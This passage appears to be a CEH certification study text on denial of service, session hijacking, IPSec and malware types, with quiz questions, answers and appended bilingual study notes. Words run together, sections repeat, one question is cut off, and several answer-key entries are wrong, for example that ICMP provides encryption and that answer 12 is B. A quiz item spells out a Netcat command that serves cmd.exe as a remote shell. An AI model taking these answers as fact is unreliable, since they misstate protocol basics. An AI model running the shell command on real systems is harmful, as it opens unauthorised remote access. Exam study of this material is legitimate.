Obviously, this is completely different for the ethical hacker. We’re not going to perform DoS attacks purposely, unless our client wants or allows us to do so. Sure, there may be some unintended DoS symptoms against a particular system or subnet, but we’re generally not going after DoS as an end result. As an aside, you’ll need to make sure your client understands the risks involved with testing; sometimes knocking on doors causes the security system to lock them all, and you don’t want your client coming back at you unaware this could have happened.
The standard DoS attack seeks to accomplish nothing more than taking down a system or simply denying access to it by authorized users. From this standpoint, the DoS might prove useful to an ethical hacker. For example, what if you removed the security personnel’s rights to watch the network? This could allow you a few minutes to hack at will, without worry of getting caught (until they notice they have no rights, of course, which won’t take long).
NOTE DDoS is one of the primary reasons many are headed toward the cloud computing route. DDoS Matt’s Bait Shop and Computer Networking Store? Not a problem. DDoS Amazon or Google? Now we’re talking.
The distributed-denial-of-service (DDoS) attack, obviously, comes not from one system but many, and they’re usually part of a botnet. The botnet is a network of zombie computers the hacker can use to start a distributed attack from (examples of botnet software/Trojans are Shark and Poison Ivy). These systems can sit idly by, doing other work for, literally, months before being called into action. That action may be as simple as sending a ping or performing some other task relevant to the attack at hand. For study purposes, the preferred communications channel used to signal the bots is IRC or Internet Chat Query
(ICQ). In the real world, it’s just as likely (perhaps even more so) to see HTTP or HTTPS employed.
EXAM TIP Another way of saying “botnet” may be the distributed reflection denial-of-service (DRDoS) attack, also known as a spoof attack. It uses multiple intermediary machines to pull off the denial of service, by having the secondary machines send the attack at the behest of the attacker. The attacker remains hidden because the attacks appear to originate from those secondary machines.
DoS and DDoS attacks are as numerous and varied as the items in the buffet lines in Las Vegas. They can range from the simple to the fairly complex, and can require one system or many to pull off. For a simple example, just try someone’s login credentials incorrectly three times in a row on a government network. Voilà! You’ve successfully DoS’d their
     account. Other relatively simple methods could be sending corrupt SMB messages on Windows machines to “blue screen” the device. Or maybe you simply “arp” the machine to death, leaving it too confused to actually send a message anywhere. The methods are innumerable.
ECC lists four basic categories of Dos/DDoS, and several examples of Dos/DDos attacks:
- Fragmentation attacks These attacks take advantage of the system’s ability (or lack thereof) to reconstruct fragmented packets.
- Volumetric attacks Also known as bandwidth attacks, these consume all available bandwidth for the system or service.
•
ApplicationattacksTheseattacksconsumetheresourcesnecessaryfor theapplicationtorun,effectivelymakingit unavailable to others.
- TCP state-exhaustion attacks These attacks go after load balancers, firewalls, and application servers by attempting to consume their connection state tables.
A short list of attacks, with all the salient information you’ll need, can be found here:
•
SYNattackThehackerwillsendthousandsuponthousandsofSYNpack etstothemachinewithafalsesourceIP address. The machine will attempt to respond with a SYN/ACK but will be unsuccessful (because the address is false). Eventually, all the machine’s resources are engaged, and it becomes a giant paperweight. - SYN flood In this attack, the hacker sends thousands of SYN packets to the target but never responds to any of the return SYN/ ACK packets. Because there is a certain amount of time the target must wait to receive an answer to the SYN/ACK, it will eventually bog down and run out of available connections.
- ICMP flood Here, the attacker sends ICMP Echo packets to the target with a spoofed (fake) source address. The target continues to respond to an address that doesn’t exist and eventually reaches a limit of packets per second sent.
- Application level A simple attack whereby the hacker sends more “legitimate” traffic to a web application than it can handle, causing the system to crash. Usually these attacks are designed to exploit weak programming code.
- Smurf The attacker sends a large number of pings to the broadcast address of the subnet, with the source IP spoofed to that of the target. The entire subnet will then begin sending ping responses to the target, exhausting the resources there. A fraggle attack is similar but uses UDP for the same purpose.
•
PingofdeathInthepingofdeath,anattackerfragmentsanICMPmessag etosendtoatarget.Whenthefragmentsare reassembled, the resultant ICMP packet is larger than the maximum size and crashes the system. (Note that this isn’t a valid attack with modern systems, but is still a definition you may need.) - Teardrop attack: a large number of garbled IP fragments with overlapping, oversized payloads are sent to the target machine. On older operating systems (such as Windows 3.1x, Windows 95, and Windows NT operating systems), this takes advantage of weaknesses in the fragment reassembly functionality of their TCP/ IP stack, causing the system to crash or reboot.
- Peer to peer In this attack, clients of a peer-to-peer file sharing hub are disconnected and directed to connect with the target system.
- Permanent Phlashing refers to a DoS attack that causes permanent damage to a system. Usually this includes damage to the hardware and can also be known as bricking a system.
NOTE A LAND attack sends a SYN packet to the target with the source IP spoofed to the same as the target IP. If vulnerable, the target will loop endlessly and crash the OS.
More than a few tools are dedicated to performing DoS on systems. Low Orbit Ion Cannon (LOIC) is a simple-to-use DDoS tool that floods a target with TCP, UDP, or HTTP requests (see Figure 9-4). Originally written open source to attack various Scientology websites, the tool has many people voluntarily joining a botnet to support all sorts of attacks. As recently as 2011, LOIC (a DDoS tool originally created and used by Anonymous) was used in a coordinated attack against Sony’s
 PlayStation network, and the tool has a track record of other successful hits: the Recording Industry Association of America, PayPal, MasterCard, and several other companies have all fallen victim to LOIC.
Figure 9-4 LOIC
Other tools include Trinity, Tribe Flood Network, and R-U-Dead-Yet. Trinity is a Linux-based DDoS tool much like LOIC. Tribe Flood Network is much the same, using voluntary botnet systems to launch massive flood attacks on targets. R-U-Dead- Yet (known by its acronym RUDY) performs DoS with HTTP POST via long-form field submissions. We could go on here, but I think you get the point. Do a quick Google search for “DoS Tool” or “DDos Tool”—you’ll find more than you need to know.
NOTE Another really groovy DoS tool worth mentioning here (even though I don’t think it’s part of your exam) isSlowloris. Slowloris is a TCP DoS tool that basically ties up open sockets and causes services to hang. It’s useful against web servers and doesn’t consume large amounts of bandwidth (www-ng.cert- ist.com/eng/ressources/ Publications_ArticlesBulletins/Environnementreseau/200906_slowloris/
 _print/).
Finally, when it comes to countermeasures against DoS attacks, you’ve probably heard all this before, so we don’t need to spend a large amount of time on the subject. Actions such as disabling unnecessary services, using a good firewall policy, and keeping security patches and upgrades up to date are pretty standard fare. Additionally, the use of a good NIDS can help against attacks from across the network. Strong, security- conscious code should be an absolute for your applications, and the use of tools such as Skydance can help detect and prevent DoS attacks. You might also look into network ingress filtering as well as some network auditing tools to help along the way.
NOTE The real answer to a true DDoS is the involvement of your ISP up channel. It will be next to impossible for you, at an endpoint locale, to keep up with attacks from a sophisticated global (or even geographically close) botnet. The ISP may wind up blocking a lot of legitimate traffic, too, but it may be all you can do until the storm passes.
Session Hijacking
Unlike DoS attacks, session hijacking attempts aren’t trying to break anything or shut off access necessarily. The idea is fairly simple: the attacker waits for a session to begin and, after all the pesky authentication gets done, jumps in to steal the session for himself. This differs a little from the spoofing attacks we’ve talked about to this point. In spoofing you’re pretending to be someone else’s address with the
     intent of sniffing their traffic while they work. Hijacking refers to the active attempt to steal the entire session from the client: the server isn’t even aware of what happened, and the client simply connects again in a different session.
From a high-level view, TCP session hijacking sounds relatively easy. First, the hacker tracks the session, watching the sequence numbers and the flow of packet headers. Next, the hacker “desynchronizes” the connection by sending a TCP reset or FIN to the client, causing it to close its side of the session. Lastly (at the same time), using the information gathered during the first step, the hacker begins sending packets to the server with the predicted (guessed) session ID, which is generated by an algorithm using the sequence numbers. If the hacker gets it right, he has taken over the session because the server thinks it’s the original client’s next packet in the series. The following more completely describes the session hijack steps (per EC-Council):
1. Sniff the traffic between the client and the server.
2. Monitor the traffic and predict the sequence numbering.
Ignoring the Obvious
  I was having dinner once at a friend’s house who was insistent on letting me know how secure his home was. The security system was in place, with all the right bells, whistles, and motion detectors appropriately arrayed throughout the house. His selection of firearms, placed strategically to provide easy access for him but not his children, was impressive. And his bolt locks on the front door? Some of the most imposing lock mechanisms I’d ever seen. Searching for a compliment,
he asked what I thought about his (as he put it) “secured home.” I responded I thought he’d done a good job, but no home or business was
totally thief-proof. He challenged me to point out how I could rob him.
So I did.
 I’d take a little time to case the house, where I’d learn quickly that his
alarm box is located in the garage and was basically made of plastic. I’d  definitely choose a time when no one was home, not only removing the firearms as a defense mechanism but to avoid being caught. Entry would be simple enough because I could just wait to capture the garage opener code (easier than it sounds). Once in the garage, I could pop the alarm box cover off, unscrew the telephone and power connectors inside the box, and voilà—I’m in. And if I wanted to be really sneaky, I’d take what I wanted and then put the alarm phone and power back together on my way out. The point was there’s almost always something that is overlooked. Professionals who spend their whole lives working security overlook things—that’s how bad guys continue to get away with stuff—
so it’s to be expected the rest of us will miss stuff here and there.
 When it comes to our line of work here, security folks sometimes overlook the obvious in denial-of-service attacks headed their way. And we’re not talking little Mom-and-Pop organizations either. PayPal fell victim to a DoS at the hands of the Internet group Anonymous, who took offense to PayPal shutting off donation plugs to WikiLeaks. Yahoo! has seen repeated attacks against its servers, and The New York Times fell victim to a variety of attacks (DDos being one of them). And it’s not just websites that are under attack. Government systems around the world, in almost every country, are under attack on a regular basis. Hactivists make use of these efforts all the time as well: The Syrian Electronic Army is a group of computer hackers aligned with Syrian President Bashar al-Assad that has used DDoS attacks to target the websites of
media organization critical of the Syrian regime.
 The lesson here? DDoS attacks are not only still relevant, they’re prevalent in our world. Google and Arbor Networks even put up a groovy digital map so you can watch DDoS attacks across the world, in
live action:
 www.digitalattackmap.com/
#anim=1&color=0&country=ALL&time=16048&view=map
 So, prepare yourself. And move your alarm box inside. 3. Desynchronize the session with the client.
4. Predict the session token and take over the session. 5. Injectpacketstothetargetserver.
NOTE Session hijacking can be done via brute force, calculation, or stealing. Additionally, you can always send a preconfigured session ID to the target; when the target clicks to open it, simply wait for authentication and jump in.
TCP session hijacking is possible because of the way TCP works. As a session-oriented protocol, it provides unique numbers to each packet, which allows the receiving machine to reassemble them in the correct, original order, even if they are received out of order. The synchronized packets we’ve talked about throughout the book set up these sequence numbers (SNs). With more than 4 billion combinations available, the idea is to have the process begin as randomly as possible. However, it is statistically possible to repeat sequence numbers and, even easier, to guess what the next one in line will be.
NOTE It is fair to note that sequence attacks are exceptionally rare in cases where you’re not in the middle. A definitive paper on the subject, despite its age, can be found at http://lcamtuf.coredump.cx/newtcp/. It provides images of sequence numbers from various operating system implementations and gives an idea of how statistically successful (or unsuccessful) you’ll be in messing with them.
So, just for clarity’s sake, let’s go back to the earlier discussion on TCP packets flying through the ether. The initial sequence number (ISN) is sent by the initiator of the session in the first step (SYN). This is acknowledged in the second handshake (SYN/ACK) by incrementing that ISN by one, and another ISN is generated by the recipient. This second number is acknowledged by the initiator in the third step (ACK), and from there on out communication can occur. The window size field will tell the recipient how much he can send before expecting a return acknowledgment. Combine all of them together and, over time, you can watch the whole thing in action. For example, consider Figure 9-5. It’s worth mentioning these types of attacks are considered very rare in the real world: outside of a very rare MITM attack, you’re as likely to see this (and Ping of Death) as you are to see a flying peacock.
     Figure 9-5 TCP communication
NOTE There are also windowing attacks for TCP that shrink the data size window.
After the handshake, for every data payload transmitted, the sequence number is incremented. In the first two steps of the three-way handshake, the ISNs are exchanged (in this case, 100 and 500) and then are incremented based on the delivery of data. In our example here, Computer A sends 3 bytes with an initial sequence number of 102, so each packet sequence number will increment accordingly—102, 103, and 104, respectively. The receiver then sends an acknowledgment of
   105 because that is the next byte it expects to receive in the next packet.
It seems easy enough, but once you add the window size and take into account that the numbers aren’t simple (like the 100 and 500 in our example), it can get hairy pretty quickly. The window size, you may recall, tells the sender how many outstanding bytes it can have on the network without expecting a response. The idea is to improve performance by allowing more than one byte at a time before requiring the “Hey, I got it” acknowledgment. This sometimes complicates things because the sender may cut back within the window size based on what’s going on network-wise and what it’s trying to send.
EXAM TIP You’ll need to remember that the sequence numbers increment on acknowledgment. Additionally, you’ll almost certainly get asked a scenario version of sequence numbering (if I were writing the test, I’d give you one). You’ll need to know, given an acknowledgment number and a window size, what sequence number would be acceptable to the system. For example, an acknowledgment of 105 with a window size of 200 means you could expect sequence numbering from 105 through 305.
Thankfully, a multitude of tools are available to assist in session hijacking. We’ve mentioned Ettercap before—a packet sniffer on steroids—but not in the context of actively hijacking sessions. It’s an excellent man-in-the-middle tool and can be run from a variety of platforms (although it is Linux native). Hunt and T-sight are probably the two best-known session hijacking tools. Hunt can sniff, hijack, and reset connections at will, whereas T-sight (commercially available) can easily hijack sessions as well as monitor additional network connections. Other tools include, but are not limited to, Zaproxy and Paros (both known more as a proxy), Burp Suite, Juggernaut (a well-known Linux- based tool), Hamster, and Ferret.
NOTE You’ve heard of session hijacking and man-in-the-middle, but what about man-in-the-browser? An MIB attack occurs when the hacker sends a Trojan to intercept browser calls. The Trojan basically sits between the browser and libraries, allowing a hacker to watch, and interact within, a browser session. Cobalt Strike creator Peiter C. Zatko (a.k.a. Mudge) added this feature a couple years back (http:// www.advancedpentest.com/help-browser-pivoting). If you have his Beacon (the name of his implant) on a box, you can “browser pivot” such that all of the target’s active sessions become your own. All of them. It effectively sets up a local proxy port so you can point your browser to it, and it directs all of your requests through the beacon on the target machine. Now you’re browsing in your own browser as them, without them even knowingit.
Countermeasures for session hijacking are, again, usually commonsense issues. For one thing, using unpredictable session IDs in the first place protects against hijacking (remember this one). Other options include limiting incoming connections, minimizing remote access, and regenerating the session key after authentication is complete. Lastly, a really good choice is to use encryption to protect the channel. We’ll cover IPSec more when we get around to cryptography, but a small refresher here (or introduction, if you know nothing about it) is a great idea—mainly because this is where ECC covers it and its encryption and authentication is considered good prevention against session hijacking.
IPSec is used to secure IP communication by providing encryption and authentication services to each packet, and it has several architectural components you’ll need to know. First, IPSec works in two modes. In transport mode, the payload and ESP trailer are encrypted; however, the IP header of the original packet is not. Transport can be used in network address translation (NAT) because the original packet is still routed in exactly the same manner as it would have been without IPSec. Tunnel mode, however, encrypts the whole thing, encapsulating the entire original packet in a new IPSec shell. This makes it incompatible with NAT. The rest of IPSec architecture includes the following protocols:
- AuthenticationHeaderAHisaprotocolwithinIPSecthatguaranteestheinte grityandauthenticationoftheIPpacket sender.
- Encapsulating Security Payload ESP is a protocol that also provides origin authenticity and integrity, but it can take care of confidentiality (through encryption) too. ESP does not provide integrity and authentication for the entire IP packet in transport mode, but in tunnel mode protection is provided to the entire IP packet.
•
InternetKeyExchangeIKEistheprotocolthatproducesthekeysforthe encryptionprocess.
- Oakley A protocol that uses Diffie-Hellman to create master and session keys.
- Internet Security Association Key Management Protocol
Software that facilitates encrypted communication between two endpoints.
If possible to implement (and it’s actually pretty easy to set up), IPSec is a good choice as a countermeasure. Not the only one, but a good one. I would say user education is key. Oftentimes an uneducated user won’t think twice about clicking past the security certificate warning, or reconnecting after being suddenly shut down, and education can help with one or two instances here and there—but don’t rely on it.
Chapter Review
Malware is generally defined as software designed to harm or secretly access a computer system without the owner’s informed consent. Some states also define malware as computer contaminant. Malvertising involves embedding malware into ad networks in an effort to throw malware across many legitimate sites. Other definition terms of note include overt channels (legitimate communication channels used by programs across a system or a network) and convert channels (used to transport data in unintended ways).
Most malware is simply downloaded from the Internet with or without the user’s knowledge. Sometimes legitimate sites get compromised, leading to infections on visiting systems. Other times drive-by downloading infects the system, usually via some weird Java vulnerability delivered through an ad stream or something like it. Peer-to-peer applications or web application “features” are often hijacked to distribute malware, and an IRC channel is always a great way to distribute malware. Sending malware (usually a Trojan) via e-mail, file sharing, or a browser is also a good distribution method.
Wrappers are programs that allow you to bind an executable of your choice (Trojan) to an innocent file your target won’t mind opening. EliteWrap is an example. Crypters are software tools that use a combination of encryption, obfuscation, and code manipulation to render malware as undetectable to AV and other security monitoring products. Exploit kit examples include Infinity, Bleeding Life, Crimepack, and Blackhole Exploit Kit.
A Trojan is software that appears to perform a desirable function for the user prior to running or installing it but instead performs a function, usually without the user’s knowledge, that steals information or otherwise harms the system (or data). Although a backdoor isn’t a Trojan, and a Trojan isn’t a backdoor, they’re tied together in this discussion and on your exam: the Trojan is the means of delivery, and the backdoor provides the open access. Trojan types include defacement Trojan, proxy server Trojan, botnet Trojans (Tor-based Chewbacca and Skynet), remote access Trojans (RAT, MoSucker, Optix Pro, and Blackhole), and e- banking Trojans (Zeus and Spyeye). convert Channel Tunneling Trojan (CCTT) is one form of remote access Trojans that uses a variety of exploitation techniques to create data transfer channels in previously authorized data streams. It’s designed to provide an external shell from within the internal environment. A command shell Trojan is intended to provide a backdoor to the system that you connect to via command-line access. Netcat is known as the “Swiss Army knife” of TCP/IP hacking, and provides all sorts of control over a remote shell on a target. Netcat can be used for outbound or inbound connections, over TCP or UDP, to or from any port on the machine. It offers DNS forwarding, port mapping and forwarding, and proxying. You can even use it as a port scanner if you’re really in a bind.
Port numbers in use by Trojans should be memorized for your exam:
 netstat will show all connections in one of several states—everything from SYN_SEND (indicating active open) to CLOSED (the server has received an ACK from the client and closed the connection). Fport is a free tool from McAfee that reports all open TCP/IP and UDP ports and maps them to the owning applications. Process Explorer is a free tool from Microsoft (formerly from SysInternals) that can tell you almost anything you’d want to know about a running process. Options for monitoring the registry include, but are not limited to, SysAnalyzer, Tiny Watcher, Active Registry Monitor, and Regshot.
Windows will automatically run everything located in Run, RunServices, RunOnce, and RunServicesOnce, and you’ll find that most questions on the exam are centered around or show you settings from HKEY_LOCAL_MACHINE.
A virus is a self-replicating program that reproduces its code by attaching copies into other executable codes. In other words, viruses create copies of themselves in other programs, then activate on some sort of trigger event (such as a specific user task, a particular time, or an event of some sort). One method for getting viruses onto a system is known as virus hoax or fake antivirus. The process involves letting a target know about a terrible virus running rampant through the world, then providing them an antivirus program (or signature file) to protect themselves with.
Here are the virus types for exam memorization:
- Ransomeware This malware locks you out of your own system resources and demands an online payment of some sort in order to release them back to you. The ransomeware “family” includes examples such as Cryptorbit, CryptoLocker, CryptoDefense, and police-themed.
- Boot sector virus Also known as a system virus, this virus type actually moves the boot sector to another location on the hard drive, forcing the virus code to be executed first.
- Shell virus Working just like the boot sector virus, this virus type wraps itself around an application’s code, inserting its own code before the application’s. Every time the application is run, the virus code is run first.
- Cluster virus This virus modifies directory table entries so that user or system processes are pointed to the virus code itself instead of the application or action intended. •
MultipartitevirusAttemptstoinfectbothfilesandthebootsectoratthes ametime.Thisgenerallyreferstoavirus with multiple infection vectors.
- Macro virus Usually written with Visual Basic for Applications (VBA), this virus type infects template files created by Microsoft Office, normally Word and Excel.
- PolymorphiccodevirusThisvirusmutatesitscodeusingabuilt- inpolymorphicengine.Thesevirusesaredifficultto find and remove because their signatures constantly change. No part of the virus stays the same from infection to infection.
•
EncryptionvirusShockingly,thesevirusesuseencryptiontohidetheco defromantivirusscanners.
•
MetamorphicvirusThisvirustyperewritesitselfeverytimeitinfectsan ewfile.
- Stealth virus Also known as a “tunneling virus,” this one attempts to evade antivirus (AV) applications by intercepting the AV’s requests to the operating system (OS) and returning them to itself instead of OS. - Cavity virus Cavity viruses overwrite portions of host files so as not to increase the actual size of the file. This is done using the null content sections of the file and leaves the file’s actual functionality intact.
- SparseinfectorvirusTheseonlyinfectoccasionally. •
FileextensionvirusTheseviruseschangethefileextensionsoffilestota keadvantageofmostpeoplehavingfile extension view turned off.
A worm is a self-replicating malware computer program that uses a computer network to send copies of itself to other systems without human intervention. Usually it doesn’t alter files, but it resides in active memory and duplicates itself, eating up resources and wreaking havoc along the way. The most common use for a worm in the hacking world is the creation of botnets. “Ghost Eye Worm” is a hacking tool that uses random messaging on Facebook and other sites to perform malicious actions. Other worms include the following:
- Code Red Exploited indexing software on IIS servers in 2001.
- Darlloz The worm for the “Internet of Things,” darlloz is a Linux- based worm that targets running ARM, MIPS, and
PowerPC architectures.
- Slammer Also known as SQL Slammer, this was a denial-of- service worm attacking buffer overflow weaknesses in Microsoft SQL Services. •
NimdaAsuccessfulfileinfectionvirusthatmodifiedandtouchednearly allwebcontentonamachine.
- Bug Bear Propagating over open network shares and e-mail, Bug Bear terminated AV applications and set up a
backdoor for later use.
- Pretty Park Pretty Park spread via e-mail (attempting a send every 30 minutes) and took advantage of IRC to propagate stolen passwords and the like.
Tools like binText and UPX can help in malware analysis. Others that can help include, but are not limited to, IDA Pro (www.hex- rays.com), VirusTotal (www.virustotal.com), Anubis (Anubis.iseclab.org), and Threat Analyzer (www.threattracksecurity.com).
The standard DoS attack seeks to accomplish nothing more than taking down a resource or denying access to it by authorized users. The distributed-denial-of-service (DDoS) attack comes not from one system but many, and they’re usually part of a botnet. The botnet is a network of zombie computers the hacker can use to start a distributed attack from (examples of botnet software/Trojans are Shark and Poison Ivy). For study purposes, the preferred communications channel used to signal the bots is IRC or Internet Chat Query (ICQ). Another way of saying “botnet” may be the distributed reflection denial of service (DRDoS) attack, also known as a spoof attack. It uses multiple intermediary machines to pull off the denial of service, by having the secondary machine send the attack at the behest of the attacker. The attacker remains hidden because the attack appears to originate from the secondary machine. ECC lists four basic categories of Dos/DDoS, and several examples of Dos/DDos attacks. The categories are as follows:
- Fragmentation attacks These attacks take advantage of the system’s ability (or lack thereof) to reconstruct fragmented packets.
- Volumetric attacks Also known as bandwidth attacks, these consume all available bandwidth for the system or service.
•
ApplicationattacksTheseattacksconsumeresourcesnecessaryforthe applicationtorun,effectivelymakingit unavailable to others.
- TCP state-exhaustion attacks These attacks go after load balancers, firewalls, and application servers by attempting to consume their connection state tables.
Here’s a short list of attacks, with all the salient information you’ll need:
•
SYNattackThehackerwillsendthousandsuponthousandsofSYNpack etstothemachinewithafalsesourceIP address. The machine will attempt to respond with a SYN/ACK but will be unsuccessful (because the address is false). Eventually, all the machine’s resources are engaged, and it becomes a giant paperweight.
- SYN flood In this attack, the hacker sends thousands of SYN packets to the target but never responds to any of the return SYN/ ACK packets. Because there is a certain amount of time the target must wait to receive an answer to the SYN/ACK, it will eventually bog down and run out of available connections.
- ICMP flood Here, the attacker sends ICMP Echo packets to the target with a spoofed (fake) source address. The target continues to respond to an address that doesn’t exist and eventually reaches a limit of packets per second sent.
- Application level A simple attack whereby the hacker simply sends more “legitimate” traffic to a web application than it can handle, causing the system to crash. Usually these are designed to exploit weakprogramming code.
- Smurf The attacker sends a large number of pings to the broadcast address of the subnet, with the source IP spoofed to that of the target. The entire subnet will then begin sending ping responses to the target, exhausting the resources there. A
fraggle attack is similar but uses UDP for the same purpose.
- Ping of death (This isn’t a valid attack with modern systems, but is still a definition you may need.) In the ping of death, an attacker fragments an ICMP message to send to a target. When the fragments are reassembled, the resultant ICMP packet is larger than the maximum size and crashes the system.
- Teardrop In a teardrop attack, a large number of garbled IP fragments with overlapping, oversized payloads are sent to the target machine. On older operating systems (such as Windows 3.1x, Windows 95, and Windows NT operating systems), this takes advantage of weaknesses in the fragment reassembly functionality of their TCP/IP stack, causing the system to crash or reboot.
- Peer to peer In this attack, clients of a peer-to-peer file-sharing hub are disconnected and directed to connect with the target system.
- Permanent Phlashing refers to a DoS attack that causes permanent damage to a system. Usually this includes damage to the hardware and can also be known as bricking a system.
The real answer to a true DDoS is the involvement of your ISP up channel. It will be next to impossible for you, at an endpoint locale, to keep up with attacks from a sophisticated global, or even geographically close, botnet. The ISP may wind up blocking a lot of legitimate traffic too, but it may be all you can do until the storm passes.
In session hijacking, an attacker waits for a session to begin and, after all the pesky authentication gets done, jumps in to steal the session for himself. The server isn’t even aware of what happened, and the client simply connects again in a different session. The following more completely describes the session hijack steps (per EC-Council):
1. Sniff the traffic between the client and the server.
2. Monitor the traffic and predict the sequence numbering. 3. Desynchronize the session with the client.
4. Predict the session token and take over the session.
5. Injectpacketstothetargetserver.
You’ll need to remember that the sequence numbers increment on acknowledgment. Additionally, you’ll almost certainly get asked a scenario version of sequence numbering. You’ll need to know, given an acknowledgment number and a window size, what sequence number would be acceptable to the system. For example, an acknowledgment of 105 with a window size of 200 means you could expect sequence numbering from 105 through 305.
IPSec is used to secure IP communication by providing encryption and authentication services to each packet, and it has several architectural components you’ll need to know. First, IPSec works in two modes. In transport mode, the payload and ESP trailer are encrypted; however, the IP header of the original packet is not. Transport can be used in network address translation (NAT) because the original packet is still routed in exactly the same manner as it would have been without IPSec. Tunnel mode, however, encrypts the whole thing, encapsulating the entire original packet in a new IPSec shell. This makes it incompatible with NAT. The rest of IPSec architecture includes the following protocols:
•
AuthenticationHeaderAHisaprotocolwithinIPSecthatguaranteesth eintegrityandauthenticationoftheIPpacket sender.
- Encapsulating Security Payload ESP is a protocol that also provides origin authenticity and integrity, but it can take care of confidentiality (through encryption) too. ESP does not provide integrity and authentication for the entire IP packet in transport mode, but in tunnel mode protection is provided to the entire IP packet.
•
InternetKeyExchangeIKEistheprotocolthatproducesthekeysforthe encryptionprocess. session keys.
- Internet Security Association Key Management Protocol
Software that facilitates encrypted communication between two endpoints.
Questions
1. Which of the following doesn’t define a method of transmitting data that violates a security policy? A. Backdoor channel
B. Sessionhijacking C. convert channel
D. Overt channel
2. Which virus type is only executed when a specific condition is met? A. Sparse infector
B. Multipartite
C. Metamorphic
D. Cavity
3. Which of the following propagates without humaninteraction? A.
Trojan
B. Worm C. Virus D. MITM
4. Which of the following don’t use ICMP in the attack? (Choose two.) A. SYNflood
B. PingofDeath
C. Smurf
D. Peer to peer
5. Which of the following is not a recommended step in recovering from a malware infection? A. Delete system restore points.
B. Backuptheharddrive. C. Removethesystemfromthenetwork. D. Reinstall from original media.
6. Which of the following is a recommendation to protect against session hijacking? (Choose two.) A. Use only nonroutable protocols.
B. Use unpredictable sequence numbers.
C. Use a file verification application, such as Tripwire.
D. Use a good password policy.
E. ImplementICMPthroughouttheenvironment.
7. Whichofthefollowingattacksanalready-authenticatedconnection? A. Smurf
B. Denial of service C. Sessionhijacking D. Phishing
8. How does Tripwire (and programs like it) help against Trojan attacks?
A. Tripwire is an AV application that quarantines and removes malware immediately.
B. Tripwire is an AV application that quarantines and removes malware after a scan.
C. Tripwire is a file-integrity-checking application that rejects malware packets intended for the kernel.
D. Tripwire is a file-integrity-checking application that notifies you when a system file has been altered, potentially indicating malware.
9. Which of the following DoS categories consume all available bandwidth for the system or service? A. Fragmentationattacks
B. Volumetric attacks
C. Applicationattacks
D. TCPstate-exhaustionattacks number of 100, and the server has offered 500. During acknowledgments, the packet shows 101 and 501, respectively, as the agreed-upon sequence numbers. With a window size of 5, which sequence numbers would the server willingly accept as part of this session?
A. 102 through 104 B. 102through501
C. 102 through 502 D. Anythingabove501
11. Which of the following is the proper syntax on Windows systems for spawning a command shell on port 56 using Netcat? A. nc -r 56 -c cmd.exe
B. nc -p 56 -o cmd.exe
C. nc -L 56 -t -e cmd.exe
D. nc -port 56 -s -o cmd.exe
12. Which of the following best describes a DRDoS?
A. Multiple intermediary machines send the attack at the behest of the attacker.
B. The attacker sends thousands upon thousands of SYN packets to the machine with a false source IP address.
C. The attacker sends thousands of SYN packets to the target but never responds to any of the return SYN/ACK packets.
D. The attack involves sending a large number of garbled IP fragments with overlapping, oversized payloads to the target machine.
13. Which of the following best describes a teardrop attack?
A. The attacker sends a packet with the same source and destination address. B. The attacker sends several overlapping, extremely large IP fragments. C. The attacker sends UDP Echo packets with a spoofed address. D. The attacker uses ICMP broadcast to DoS targets.
Answers
1. D. Overt channels are legitimate, and used legitimately. Everything else listed is naughty.
2. A. Sparse infector viruses only fire when a specific condition is met. For example, maybe the fifth time Calculator is run, whammo—virus execution.
3. B. Much like Skynet from the Terminator movies, worms do not need us.
4. A, D. A SYN flood doesn’t use ICMP at all, nor does a peer-to-peer attack.
5.
B.Backingupaharddrivethat’salreadyinfectedmakesasmuchsenseasputtin gketchuponadoughnut.Themalicious files are on the drive, so backing it up does nothing but ensure you’ll reinfect something later on.
6.
B,E.Unpredictablesequencenumbersmakesessionhijackingnearlyimpossi ble,andimplementingICMP—which provides encryption and authentication services—is also probably a good idea.
7. C. Session hijacking takes advantage of connections already in place and already authenticated.
8. D.Tripwireisoneofthebetter- knownfileintegrityverifiers,anditcanhelppreventTrojansbynotifyingyou
immediately when an important file is altered.
9. B. Volumetric attacks consume all available bandwidth for the system or service. ▪


## server will accept packets between 102 and 106 before sending an acknowledgment.
11. C. This is the correct syntax for using Netcat to leave a command shell open on port 56.
12. B. The distributed reflection denial of service (DRDoS) attack is, for all intents and purposes, a botnet. Secondary systems carry out the attacks so the attacker remains hidden.
13. B. In a teardrop attack, the reassembly of fragments takes down the target.
Malware and Crypto-Malware
Malware (malicious software): software that does harm—intentionally (such as a virus) or unintentionally (such as poorly written code).
- software designed to harm or secretly access a computer system without the owner’s informed consent.
crypto-malware:
the malware incorporates cryptography, a subset of malware.
Will encrpyt your document, make it no longer visible.
software exploitation: attacks launched against applications and higher-level services. They include gaining access to data
using weaknesses in the data access objects of a database
or a flaw in a service or application.
     Malvertising = Malware + Advertising
Malware(惡意程式)以動作區分的類型:
共同目標:建立秘密(convert)通訊的後門
(1)Trojan:
- well-content:不需靠宿主存活
- 目的:隱藏自己
- 特徵:Dropper(藏在特定路徑或檔案)
(2)Virus:
- incomplete code:需靠宿主存活
- 目的:大量複製
- 特徵:改變(alter)宿主code的執行順序
(3)Worm:
- well-content:不需靠宿主存活
- 目的:大量複製
- 特徵:量大 ▪


## Regardless of type, there needs to be a way to distribute the malware and get it installed on machines.
- Most malware is simply downloaded from the Internet with or without the user’s knowledge.
- Sometimes legitimate sites get compromised, leading to infections on visiting systems.
- drive-by downloading infects the system, usually via some weird Java vulnerability delivered through an ad stream or something like it.
- Peer-to-peer applications or web application “features” are often hijacked to distribute malware, and an IRC channel is always a great way to distribute malware.
EXAM TIP
- Overt channels: legitimate communication channels used by programs across a system / network
convert channels: used to transport data in unintended ways.
worm:
- A malware program.
  - primary focus: spreading and function as a stand-alone entity, classified
 as a worm.
- self-replicating malware
- travels throughout a network without the assistance of a host application or user interaction. From system to system.
- A worm resides in memory and can use different transport protocols to travel over the network.
  - primary purpose: spread by self-replication (Like virus): replicate functional copies and spreads it without the need to inject itself in other programs.
  - To spread, worms exploit a vulnerability on the target system or use some social engineering to trick users into executing them.
  - A worm enters a computer through a vulnerability, takes advantage of file-transport or information-transport features to travel unaided 独力的.
  - More advanced worms leverage encryption, wipers, and ransomware technologies to harm their targets.
  - infect other programs without human interaction (viruses don’t)
  - Viruses: require the spreading of an infected host file
  - Worms: standalone software, propagate do not require host program or human.
- Carry malicious payload (deleting file, installing a backdoor...)
- significant problems: flood a network, result in DoS attack, consume network
bandwidth.
